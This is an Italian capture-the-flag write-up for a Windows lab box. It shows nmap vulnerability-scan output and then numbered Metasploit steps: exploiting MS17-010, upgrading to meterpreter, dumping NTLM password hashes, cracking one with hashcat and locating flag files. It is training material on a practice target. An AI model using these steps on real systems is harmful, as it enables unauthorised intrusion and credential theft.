
![](images/image1.png)

# Introduzione

## Sistema operativo

Windows

# Enumeration

## nmap

```bash
root@ip-10-10-206-243:~\# nmap -sC -sV --script vuln 10.10.65.208Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-16 14:29 GMT  
Nmap scan report for ip-10-10-65-208.eu-west-1.compute.internal (10.10.65.208)  
Host is up (0.00040s latency).  
Not shown: 991 closed ports  
PORT      STATE SERVICE       VERSION  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)  
3389/tcp  open  ms-wbt-server Microsoft Terminal Service  
| rdp-vuln-ms12-020:  
|   VULNERABLE:  
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability  
|     State: VULNERABLE  
|     IDs:  CVE:CVE-2012-0152  
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)  
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.  
|            
|     Disclosure date: 2012-03-13  
|     References:  
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020  
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152  
|    
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability  
|     State: VULNERABLE  
|     IDs:  CVE:CVE-2012-0002  
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)  
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.  
|            
|     Disclosure date: 2012-03-13  
|     References:  
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020  
|\_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002  
|\_ssl-ccs-injection: No reply from server (TIMEOUT)  
|\_sslv2-drown:  
49152/tcp open  msrpc         Microsoft Windows RPC  
49153/tcp open  msrpc         Microsoft Windows RPC  
49154/tcp open  msrpc         Microsoft Windows RPC  
49158/tcp open  msrpc         Microsoft Windows RPC  
49160/tcp open  msrpc         Microsoft Windows RPC  
MAC Address: 02:10:AC:A1:5D:77 (Unknown)  
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|\_samba-vuln-cve-2012-1182: NT\_STATUS\_ACCESS\_DENIED  
|\_smb-vuln-ms10-054: false|\_smb-vuln-ms10-061: NT\_STATUS\_ACCESS\_DENIED  
| smb-vuln-ms17-010:  
|   VULNERABLE:  
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)  
|     State: VULNERABLE  
|     IDs:  CVE:CVE-2017-0143  
|     Risk factor: HIGH  
|       A critical remote code execution vulnerability exists in Microsoft SMBv1  
|        servers (ms17-010).  
|            
|     Disclosure date: 2017-03-14  
|     References:  
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/  
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  
|\_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 160.44 seconds
```

# Exploitation

1.  Con metasploit sfruttare la vulnerabilità ms17-010
2.  Ottenere la shell e fare CTRL+Z per metterla in background
3.  Convertire la shell in sessione meterpreter con questo modulo post:  
    post/multi/manage/shell\_to\_meterpreter
4.  `sessions -l` per vedere tutte le sessioni
5.  `getsystem` per vedere se abbiamo ottenuto alti privilegi
6.  con il comando `shell` si può ottenere una shell pura
7.  con il comando `hashdump` si ottengono gli hash delle password degli utenti


    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

8.  Usare hashcat per craccare la password:  
    `hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt`
9.  e poi per visualizzarla:  
    `hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt –show ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22`
10.  Per cercare i flag si torna sulla shell meterpreter:  
```bash  
 meterpreter > search -f flag\*.txt

Found 3 results...

    c:\\flag1.txt (24 bytes)

    c:\\Users\\Jon\\Documents\\flag3.txt (37 bytes)

    c:\\Windows\\System32\\config\\flag2.txt (34 bytes)
```
  

Privilege escalation

Non necessaria, l’exploit mi faceva già essere SYSTEM
